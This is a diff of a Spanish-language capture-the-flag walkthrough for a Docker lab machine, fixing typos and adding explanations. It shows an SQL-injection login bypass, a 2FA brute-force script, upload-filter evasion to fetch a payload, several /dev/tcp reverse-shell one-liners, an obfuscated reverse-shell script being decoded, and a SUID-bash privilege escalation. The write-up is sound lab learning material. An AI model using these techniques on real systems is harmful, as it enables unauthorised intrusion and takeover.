@@ -12,7 +12,7 @@ sudo ip addres del 172.17.0.1/16 dev docker0 # elimina mi actual direccion ip
 con este comando eliminamos la actual direccion ip en docker
 
 ```bash
-sudo ip addres add 172.17.0.183/16 dev docker0# asigno la ip de la reverseshell
+sudo ip addres add 172.17.0.183/16 dev docker0 # asigno la ip de la reverseshell
 ```
 con este comando asigno la nueva dirección,
 *esto no debería hacerse aquí pero de no hacerse en una fase avanzada nos va a tocar volver a hacer todo de cero por la nueva interfaz de red*
@@ -40,7 +40,7 @@ PORT   STATE SERVICE REASON         VERSION
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 ```
 
-Solo tenemos el puerto 80, asi pues vamos manos a la obra (con whatweb no encontré nada interesante y el código fuente de la página tampoco)
+Solo tenemos el puerto 80, asi pues vamos manos a la obra (con whatweb no encontré nada interesante y en código fuente de la página tampoco)
 
 ##paso 3:intrusión desde la página web
 realizo un fuzzing para ver de que otras rutas dispongo:
@@ -60,12 +60,12 @@ http://172.17.0.2/index.php
 http://172.17.0.2/javascript => http://172.17.0.2/javascript/
 http://172.17.0.2/javascript/jquery => http://172.17.0.2/javascript/jquery/
 ```
-no encuentro nada relevante en ellas y me centro el el index.php, hay un login y pruebo una inyeccion sencilla:
+no encuentro nada relevante en ellas y me centro el el index.php, hay un login y pruebo una inyección sencilla:
 ```bash
 admin'or 1=1-- -
 ```
 y nos manda a otro panel para un segundo factor de autentificacion, en el cual se introducen 4 digitos, mi idea inicial es un ataque por fuezabruta pero,
-hay intentos fallidos asique hago una captura con brupsuite de las dos peticines y m ehago un scriipt para automatizalo:
+hay intentos fallidos (3 al cuarto sales del 2fa) asi que hago una captura con brupsuite de las dos peticiones y me hago un script para automatizalo:
 ```bash
 import requests
 import time
@@ -149,7 +149,7 @@ def attempt_2fa():
 if authenticate_initial():
     attempt_2fa()
 ```
-lo ejeecuto y:
+lo ejecuto y:
 ```bash
 python3 fuerzabruta.py
 ```
@@ -166,13 +166,14 @@ ya sabemos el segundo factor de autentificacion 0150, hacemos la inyeccion sql y
 http://172.17.0.2/subir_archivos.php
 ```
 Aquí nos deja subir archivo en python y los ejecuta,
-intento subir varios archivos con rev y tiene una black list que no me deja ejecutarlos, hay dos opciones:
+intento subir varios archivos con reverse y tiene una black list que no me deja ejecutarlos, hay dos opciones:
+
 -ofuscar
 
 -crear un script
 
-me incliné por crear un script sin saber muy bien las palabras prohibidas de la black list pero:
-pruebo este script
+me incliné por crear un script sin saber muy bien las palabras prohibidas de la black list pero,
+pruebo este script:
 ```bash
 import subprocess
 
@@ -182,7 +183,7 @@ result = subprocess.run(['ls', '-la', '/var/www'], capture_output=True, text=Tru
 # Imprimir la salida del comando
 print(result.stdout)
 ```
-y en la salida veo un archivo interesante
+y en la salida veo un archivo interesante (ids.py):
 ```
 total 24
 drwxr-xr-x 1 root     root     4096 Nov 27 17:33 .
@@ -212,11 +213,11 @@ creo un script con la reverseshell con nombre rev
 #!/bin/bash
 bash -i >& /dev/tcp/172.17.0.183/4444 0>&1
 ```
-monto un servidor python donde está la reverse:
+monto un servidor python donde está alojada la reverse:
 ```bash
 sudo python3 -m http.server 80
 ```
-creo un script para subir al seervidor que me haga un curl a mi archivo con el nombre curl.py
+creo un script para subir al seervidor la reverseshell haciendo que me haga un curl a mi archivo con el nombre curl.py
 ```bash
 import subprocess
 
@@ -231,7 +232,7 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error al descargar el archivo: {e}")
 ```
-lo subo al servidor y he subido mi script a /tmp/rev
+lo subo al servidor, lo ejecuta, y he subido mi script a /tmp/rev
 ```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -289,9 +290,9 @@ despues de rebuscar encuentro un zip en
 ```
 /var/backups/.maci/.-/-/archivo500.zip
 ```
-lo trigo a mi maquina y al descomprimirlo hay otro zip y al descomprimir otro... ahí creé otro script, este lo dejo para que lo tabajeis no es muy dificil
+lo traigo a mi máquina y al descomprimirlo hay otro zip y al descomprimir otro... ahí creé otro script, este lo dejo para que lo tabajeis no es muy difícil.
 
-llego a un punto que obtengo el archivo archivo0.zip que me pide un password, con mi buen amigo john puedo descomprimir el contenido:
+Llego a un punto que obtengo el archivo "archivo0.zip" que me pide un password, con mi buen amigo john puedo descomprimir el contenido:
 ```bash
 zip2john archivo0.zip > hash
 ```
@@ -316,7 +317,7 @@ sudo -l
 User maci may run the following commands on dc4ed2927b32:
     (darksblack) NOPASSWD: /usr/bin/irssi
 ```
-pues lo ejecutamos
+pues lo ejecutamos como usuario darksblack
 ```bash
 sudo -u darksblack /usr/bin/irssi
 ```
@@ -329,7 +330,7 @@ entonces me creo una reverse y la ejecuto con exec, previamente me pongo en escu
 ```bash
 sudo nc -nvlp 5555
 ```
-y en irssi
+y en irssi ([(status)] lo trae por defecto irssi, es para que os ubiqueis donde se meten los comandos)
 ```bash
 [(status)] /exec bash -c "bash -i >& /dev/tcp/172.17.0.183/5555 0>&1"
 ```
@@ -397,7 +398,16 @@ desofuscar_codigo(archivo_entrada, archivo_salida)
 exec("".join([i, m, p, o, r, t,  , b, a, s, e, 6, 4, ;,  , e, x, e, c, (, b, a, s, e, 6, 4, ., b, 6, 4, d, e, c, o, d, e, (, b, a, s, e, 6, 4, ., b, 3, 2, d, e, c, o, d, e, (, ', M, F, L, T, C, 5, 3, C, G, N, F, D, A, S, K, I, J, Y, 2, W, G, 5, 3, Q, O, B, R, F, Q, Q, T, W, M, N, X, F, C, Z, 3, C, G, N, G, U, W, Y, K, X, G, F, 3, W, E, M, 2, K, G, B, E, U, Q, T, R, R, L, F, X, E, E, 6, L, C, G, J, H, G, Y, Y, Z, T, J, V, F, W, C, V, Z, R, O, 5, R, D, G, S, R, Q, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, B, O, B, Y, G, E, W, C, C, O, Y, F, G, G, 3, S, R, M, 5, S, E, O, 3, D, U, L, J, I, W, 6, S, 2, T, I, U, 4, V, I, V, S, D, I, E, 4, U, S, Q, 2, J, P, B, H, H, U, S, L, V, J, V, K, G, G, 5, K, N, I, M, 2, H, Q, T, 2, E, J, V, U, U, G, 3, C, C, K, B, K, W, Y, U, L, H, K, B, J, U, C, M, K, N, I, R, A, X, S, Q, 3, H, O, B, V, V, U, V, 2, Z, M, 5, M, T, E, O, L, V, M, J, W, V, M, 2, T, E, I, N, U, G, 6, C, T, C, G, N, H, D, A, T, C, D, I, J, 3, W, E, M, 2, K, G, B, F, V, I, 3, 2, L, J, F, B, U, C, Z, 2, J, J, B, G, W, O, U, C, T, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, 2, I, J, Z, 3, F, S, M, T, U, N, R, S, E, G, N, K, C, K, J, W, D, S, S, S, U, N, N, L, F, K, T, C, D, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, B, J, K, T, A, O, K, E, K, M, Y, T, S, V, C, W, I, Z, F, E, M, U, K, V, G, B, Y, E, G, 2, K, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 5, T, C, N, U, 2, W, Y, W, J, T, K, F, X, U, W, R, 3, I, O, Z, R, T, G, U, L, T, J, F, E, E, E, 5, T, D, N, Z, I, X, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, R, W, 2, V, R, Q, M, R, M, E, U, 5, K, J, J, B, G, U, W, Q, 3, N, K, J, W, A, U, W, T, J, I, I, Z, V, S, V, 3, M, G, B, M, D, E, W, T, W, M, N, W, D, S, 2, T, C, G, I, Y, X, I, W, K, X, G, V, V, U, W, S, C, N, O, B, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, 2, I, 5, D, D, A, W, K, T, I, E, 4, U, S, S, C, N, O, V, R, W, 2, V, T, K, M, R, U, W, O, 6, C, N, I, R, E, T, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, Q, V, O, W, L, H, L, J, D, U, M, M, A, K, L, F, J, U, C, O, K, Q, K, N, A, W, S, Y, 2, Y, K, Z, Y, G, I, R, T, Y, O, V, E, W, U, 3, 2, L, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, E, Y, 3, K, O, O, N, R, D, G, T, T, M, J, N, B, W, W, S, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, C, P, J, S, V, Q, T, L, V, L, J, M, G, Q, 4, D, E, I, N, T, X, O, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 4, F, E, S, 6, K, C, G, B, Q, U, O, V, L, H, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, K, H, K, J, Y, F, U, V, 2, R, J, N, E, U, G, Q, L, H, J, F, D, V, M, 4, 3, B, K, 5, M, W, O, Y, S, H, K, Z, 2, U, W, R, 2, S, N, B, S, E, O, R, L, Q, J, F, C, D, A, O, K, J, I, R, A, T, M, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, N, W, V, M, M, D, E, L, B, F, H, K, C, S, J, I, Z, J, H, S, Z, C, X, K, V, F, U, S, Q, 2, B, M, 5, E, U, O, V, T, T, M, M, Z, F, K, N, S, D, M, 5, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, Q, Q, T, Z, M, I, Z, E, 2, Z, 2, Q, K, N, B, H, U, Z, C, X, J, J, 3, W, G, 3, J, Z, N, J, N, F, Q, T, T, 2, J, R, W, E, E, 5, T, D, I, 5, L, H, K, S, 2, H, K, J, U, G, I, R, 2, F, O, N, E, U, Q, T, T, P, B, J, N, F, O, 6, D, T, K, B, L, F, E, 6, L, E, K, 5, K, X, G, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, K, B, M, E, 4, M, K, Z, N, Z, B, H, S, Y, R, S, J, Z, W, A, U, Y, Z, T, J, V, 2, V, K, R, L, M, K, F, J, F, G, 5, 3, H, M, M, Z, V, E, 2, 2, 2, L, B, F, H, S, U, C, Y, J, Y, Y, V, S, 3, S, C, P, F, R, D, E, T, T, M, M, M, Z, U, 2, 5, K, V, I, V, W, F, C, U, S, T, O, 5, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, G, I, R, 2, S, O, B, R, G, U, M, L, 2, M, R, L, U, U, 5, 3, D, N, U, 4, W, U, W, S, Y, J, Z, 5, E, Y, 3, C, C, J, J, K, U, K, V, L, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, L, A, Z, V, U, 2, D, C, J, B, L, G, Y, S, K, E, G, B, T, W, G, S, C, K, O, Y, F, F, S, 6, J, V, P, J, S, E, O, U, T, W, M, R, M, F, C, 5, L, D, N, V, L, G, Q, W, S, D, M, 5, Y, E, S, Q, 3, T, M, 5, R, U, Q, S, T, W, L, F, 4, T, K, 6, T, E, I, 5, J, G, Y, Y, 3, O, J, F, 2, W, G, 3, K, W, N, B, N, E, G, Z, 3, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, 6, J, V, P, J, N, F, O, N, L, L, J, N, E, E, 4, M, C, 2, I, 4, 4, T, C, C, T, E, I, Y, 4, T, E, W, K, X, P, A, Y, V, U, U, 3, L, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, S, W, S, Y, K, I, Y, W, G, 3, J, U, M, 5, J, G, 2, R, T, T, M, M, Z, F, K, S, 2, D, N, V, J, G, Y, W, T, J, I, J, 2, F, S, V, 3, M, O, V, F, U, G, 2, Z, W, I, N, U, U, C, Z, 2, J, I, N, B, D, G, Y, K, H, N, R, Z, V, U, U, 2, C, K, V, R, W, 4, V, T, M, B, J, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, Z, 3, F, S, M, T, U, N, R, S, E, M, O, L, L, M, F, L, V, M, 2, 2, J, I, Q, Y, G, O, U, T, N, I, Z, Z, W, G, M, S, V, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, D, A, Y, 3, O, N, M, 3, E, G, 2, K, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, V, T, Q, U, U, C, T, I, J, V, G, E, M, R, V, O, V, N, F, O, T, R, Q, J, N, C, W, Q, U, C, V, G, F, I, X, G, S, K, G, I, J, I, F, K, 3, C, R, O, B, B, W, S, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, S, D, E, N, 5, Q, V, O, 6, D, M, J, F, D, T, K, 5, T, E, I, N, B, H, U, Y, R, S, J, Z, Z, F, U, W, C, S, M, Z, N, E, O, 3, D, M, L, J, C, G, 6, S, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, G, H, F, V, W, C, V, 2, W, N, N, E, U, I, M, D, H, M, Q, Z, E, M, 4, D, E, I, Y, 4, W, 2, Y, R, T, J, J, T, F, S, M, R, Z, O, R, R, F, O, R, T, V, L, J, B, W, Q, 6, S, L, K, F, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 4, F, E, S, Q, 2, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 4, 3, C, G, N, H, G, Y, S, 2, D, N, N, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, E, 3, D, F, I, 5, H, G, Y, Y, 2, I, K, F, T, W, G, M, R, Z, N, J, Q, T, E, V, R, Q, J, R, W, V, M, 6, L, D, N, U, 4, X, S, T, 3, H, N, 5, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, O, C, S, Z, L, B, H, H, U, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, R, D, W, Y, 5, C, 2, K, M, 2, X, U, Y, S, H, K, Z, W, G, G, Q, 3, H, G, F, F, V, C, 3, 2, L, M, F, L, V, S, Z, 2, Y, G, E, 4, X, K, W, K, X, G, F, W, F, Q, M, J, Y, M, 5, I, F, I, M, D, H, J, F, W, D, S, Z, T, C, K, 5, D, H, A, Y, T, M, H, F, T, E, S, 2, T, P, J, N, E, U, G, Q, L, H, B, J, E, U, Q, T, R, V, M, N, 4, T, K, 3, D, F, I, 5, W, D, A, S, 2, H, G, F, U, G, C, V, Z, U, N, 5, F, V, G, 2, 2, L, B, I, =, =, =, =, =, =, ', ), ), )]))
 ```
 ya sabeis quitar comas y os queda un código muy bonito, la otra opcion es quedarte con la cadena original y con sed y regex te quedas solo con el codigo en ASCII y online lo puedes desencriptar
-la conclusion tenemos un base 32
+
+me cojo toda esta parte del codigo:
+```
+ M, F, L, T, C, 5, 3, C, G, N, F, D, A, S, K, I, J, Y, 2, W, G, 5, 3, Q, O, B, R, F, Q, Q, T, W, M, N, X, F, C, Z, 3, C, G, N, G, U, W, Y, K, X, G, F, 3, W, E, M, 2, K, G, B, E, U, Q, T, R, R, L, F, X, E, E, 6, L, C, G, J, H, G, Y, Y, Z, T, J, V, F, W, C, V, Z, R, O, 5, R, D, G, S, R, Q, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, B, O, B, Y, G, E, W, C, C, O, Y, F, G, G, 3, S, R, M, 5, S, E, O, 3, D, U, L, J, I, W, 6, S, 2, T, I, U, 4, V, I, V, S, D, I, E, 4, U, S, Q, 2, J, P, B, H, H, U, S, L, V, J, V, K, G, G, 5, K, N, I, M, 2, H, Q, T, 2, E, J, V, U, U, G, 3, C, C, K, B, K, W, Y, U, L, H, K, B, J, U, C, M, K, N, I, R, A, X, S, Q, 3, H, O, B, V, V, U, V, 2, Z, M, 5, M, T, E, O, L, V, M, J, W, V, M, 2, T, E, I, N, U, G, 6, C, T, C, G, N, H, D, A, T, C, D, I, J, 3, W, E, M, 2, K, G, B, F, V, I, 3, 2, L, J, F, B, U, C, Z, 2, J, J, B, G, W, O, U, C, T, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, 2, I, J, Z, 3, F, S, M, T, U, N, R, S, E, G, N, K, C, K, J, W, D, S, S, S, U, N, N, L, F, K, T, C, D, I, J, 5, G, E, M, S, O, O, J, N, F, Q, U, L, V, B, J, K, T, A, O, K, E, K, M, Y, T, S, V, C, W, I, Z, F, E, M, U, K, V, G, B, Y, E, G, 2, K, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 5, T, C, N, U, 2, W, Y, W, J, T, K, F, X, U, W, R, 3, I, O, Z, R, T, G, U, L, T, J, F, E, E, E, 5, T, D, N, Z, I, X, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, R, W, 2, V, R, Q, M, R, M, E, U, 5, K, J, J, B, G, U, W, Q, 3, N, K, J, W, A, U, W, T, J, I, I, Z, V, S, V, 3, M, G, B, M, D, E, W, T, W, M, N, W, D, S, 2, T, C, G, I, Y, X, I, W, K, X, G, V, V, U, W, S, C, N, O, B, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, 2, I, 5, D, D, A, W, K, T, I, E, 4, U, S, S, C, N, O, V, R, W, 2, V, T, K, M, R, U, W, O, 6, C, N, I, R, E, T, A, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 5, Q, V, O, W, L, H, L, J, D, U, M, M, A, K, L, F, J, U, C, O, K, Q, K, N, A, W, S, Y, 2, Y, K, Z, Y, G, I, R, T, Y, O, V, E, W, U, 3, 2, L, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, E, Y, 3, K, O, O, N, R, D, G, T, T, M, J, N, B, W, W, S, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, C, P, J, S, V, Q, T, L, V, L, J, M, G, Q, 4, D, E, I, N, T, X, O, S, 2, R, N, 5, T, U, S, Q, 2, B, M, 4, F, E, S, 6, K, C, G, B, Q, U, O, V, L, H, M, M, Z, D, S, 2, T, B, G, J, L, D, A, S, K, H, K, J, Y, F, U, V, 2, R, J, N, E, U, G, Q, L, H, J, F, D, V, M, 4, 3, B, K, 5, M, W, O, Y, S, H, K, Z, 2, U, W, R, 2, S, N, B, S, E, O, R, L, Q, J, F, C, D, A, O, K, J, I, R, A, T, M, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, N, W, V, M, M, D, E, L, B, F, H, K, C, S, J, I, Z, J, H, S, Z, C, X, K, V, F, U, S, Q, 2, B, M, 5, E, U, O, V, T, T, M, M, Z, F, K, N, S, D, M, 5, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, Q, Q, T, Z, M, I, Z, E, 2, Z, 2, Q, K, N, B, H, U, Z, C, X, J, J, 3, W, G, 3, J, Z, N, J, N, F, Q, T, T, 2, J, R, W, E, E, 5, T, D, I, 5, L, H, K, S, 2, H, K, J, U, G, I, R, 2, F, O, N, E, U, Q, T, T, P, B, J, N, F, O, 6, D, T, K, B, L, F, E, 6, L, E, K, 5, K, X, G, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, K, B, M, E, 4, M, K, Z, N, Z, B, H, S, Y, R, S, J, Z, W, A, U, Y, Z, T, J, V, 2, V, K, R, L, M, K, F, J, F, G, 5, 3, H, M, M, Z, V, E, 2, 2, 2, L, B, F, H, S, U, C, Y, J, Y, Y, V, S, 3, S, C, P, F, R, D, E, T, T, M, M, M, Z, U, 2, 5, K, V, I, V, W, F, C, U, S, T, O, 5, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, J, 5, G, I, R, 2, S, O, B, R, G, U, M, L, 2, M, R, L, U, U, 5, 3, D, N, U, 4, W, U, W, S, Y, J, Z, 5, E, Y, 3, C, C, J, J, K, U, K, V, L, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, M, 2, S, N, N, R, D, G, V, R, Q, L, A, Z, V, U, 2, D, C, J, B, L, G, Y, S, K, E, G, B, T, W, G, S, C, K, O, Y, F, F, S, 6, J, V, P, J, S, E, O, U, T, W, M, R, M, F, C, 5, L, D, N, V, L, G, Q, W, S, D, M, 5, Y, E, S, Q, 3, T, M, 5, R, U, Q, S, T, W, L, F, 4, T, K, 6, T, E, I, 5, J, G, Y, Y, 3, O, J, F, 2, W, G, 3, K, W, N, B, N, E, G, Z, 3, Q, I, N, U, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, W, G, 6, J, V, P, J, N, F, O, N, L, L, J, N, E, E, 4, M, C, 2, I, 4, 4, T, C, C, T, E, I, Y, 4, T, E, W, K, X, P, A, Y, V, U, U, 3, L, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, S, W, S, Y, K, I, Y, W, G, 3, J, U, M, 5, J, G, 2, R, T, T, M, M, Z, F, K, S, 2, D, N, V, J, G, Y, W, T, J, I, J, 2, F, S, V, 3, M, O, V, F, U, G, 2, Z, W, I, N, U, U, C, Z, 2, J, I, N, B, D, G, Y, K, H, N, R, Z, V, U, U, 2, C, K, V, R, W, 4, V, T, M, B, J, H, W, O, 3, 3, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, Z, 3, F, S, M, T, U, N, R, S, E, M, O, L, L, M, F, L, V, M, 2, 2, J, I, Q, Y, G, O, U, T, N, I, Z, Z, W, G, M, S, V, J, N, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, D, A, Y, 3, O, N, M, 3, E, G, 2, K, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, I, J, V, T, Q, U, U, C, T, I, J, V, G, E, M, R, V, O, V, N, F, O, T, R, Q, J, N, C, W, Q, U, C, V, G, F, I, X, G, S, K, G, I, J, I, F, K, 3, C, R, O, B, B, W, S, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, S, D, E, N, 5, Q, V, O, 6, D, M, J, F, D, T, K, 5, T, E, I, N, B, H, U, Y, R, S, J, Z, Z, F, U, W, C, S, M, Z, N, E, O, 3, D, M, L, J, C, G, 6, S, Y, K, J, F, B, U, C, Z, 2, J, I, N, A, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, E, E, 4, 5, S, Z, G, J, 2, G, Y, Z, C, G, H, F, V, W, C, V, 2, W, N, N, E, U, I, M, D, H, M, Q, Z, E, M, 4, D, E, I, Y, 4, W, 2, Y, R, T, J, J, T, F, S, M, R, Z, O, R, R, F, O, R, T, V, L, J, B, W, Q, 6, S, L, K, F, X, W, O, S, K, D, I, F, T, U, S, Q, 2, B, M, 4, F, E, S, Q, 2, B, M, 5, E, U, G, Q, T, 2, J, R, W, U, 4, 4, 3, C, G, N, H, G, Y, S, 2, D, N, N, F, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, E, 3, D, F, I, 5, H, G, Y, Y, 2, I, K, F, T, W, G, M, R, Z, N, J, Q, T, E, V, R, Q, J, R, W, V, M, 6, L, D, N, U, 4, X, S, T, 3, H, N, 5, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, J, F, B, U, C, Z, 2, J, I, N, B, H, O, C, S, Z, L, B, H, H, U, Q, 3, J, I, F, T, U, S, Q, 2, B, M, 5, E, U, G, Q, L, H, M, R, D, W, Y, 5, C, 2, K, M, 2, X, U, Y, S, H, K, Z, W, G, G, Q, 3, H, G, F, F, V, C, 3, 2, L, M, F, L, V, S, Z, 2, Y, G, E, 4, X, K, W, K, X, G, F, W, F, Q, M, J, Y, M, 5, I, F, I, M, D, H, J, F, W, D, S, Z, T, C, K, 5, D, H, A, Y, T, M, H, F, T, E, S, 2, T, P, J, N, E, U, G, Q, L, H, B, J, E, U, Q, T, R, V, M, N, 4, T, K, 3, D, F, I, 5, W, D, A, S, 2, H, G, F, U, G, C, V, Z, U, N, 5, F, V, G, 2, 2, L, B, I, =, =, =, =, =, =
+```
+la meto en un archivo llamado cadena.txt y con regex:
+```bash
+cat cadena.txt | tr -d ', ' > sin_comas_ni_espacios.txt 
+```
+tenemos un base 32 que guardo en un archivo denombre base32
 ```
 aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHNvY2tldAppbXBv
 cnQgdGltZQoKSE9TVCA9ICIxNzIuMTcuMC4xODMiClBPUlQgPSA1MDAyCgpkZWYgY29ubmVjdCho
@@ -423,6 +433,7 @@ y con
 ```bash
 cat base32 | base64 -d
 ```
+podemos por fin leer el script sin ofuscar
 ```
 import sys
 import os
@@ -470,7 +481,7 @@ def main():
 if __name__ == "__main__":
     sys.exit(main())
 ```
-este script entabla una reverse shell aqui:
+este script entabla una reverse shell aquí:
 ```
 HOST = "172.17.0.183"
 PORT = 5002
@@ -490,7 +501,7 @@ y ejecutamos el script
 ```bash
 sudo -u juan /usr/bin/python3 /home/juan/shell.py
 ```
-estamos dentro pero....horror al cabo de un tiempo cierra conexión, para saltarmelo lo que hago es ponerme en la escucha en el puerto 6666 y mandarme una rev ahi
+estamos dentro pero....horror al cabo de un tiempo cierra conexión, para saltarmelo lo que hago es ponerme en la escucha en el puerto 6666 y mandarme una rev ahi desde la interfaz del netcat del puerto 5002:
 ```
 listening on [any] 5002 ...
 connect to [172.17.0.183] from (UNKNOWN) [172.17.0.2] 42780
@@ -520,17 +531,17 @@ Matching Defaults entries for juan on dc4ed2927b32:
 User juan may run the following commands on dc4ed2927b32:
     (ALL : ALL) NOPASSWD: /home/juan/mensajes.sh
 ```
-puedo ejecutar un script llamado mensajes.sh que esta en mi home...veamos que permisos tiene:
+puedo ejecutar un script llamado mensajes.sh que está en mi home...veamos que permisos tiene:
 ```bash
 ls -la /home/juan/mensajes.sh
 ```
 ```
 -rwx--x--x 1 root root 181 Nov 21 21:03 /home/juan/mensajes.sh
 ```
-no puedo hacer otra cosa que leer..pero..esta en mi home, vamos a borrarlo y crear el mismo script con lo que quiera
+no puedo hacer otra cosa que leer,pero está en mi home, vamos a borrarlo y crear el mismo script con lo que quiera
 ```bash
 rm mensajes.sh #elimino el archivo
-echo 'chmod u+s /bin/bash' > mensajes.sh # doy permisos suid a la /bin/bash
+echo 'chmod u+s /bin/bash' > mensajes.sh # doy permisos suid a la /bin/bash y lo guardo en un script de mismo nombre que el borrado
 chmod +x mensajes.sh # doy permisos de ejecución
 sudo -u root /home/juan/mensajes.sh #ejecuto el script
 ```
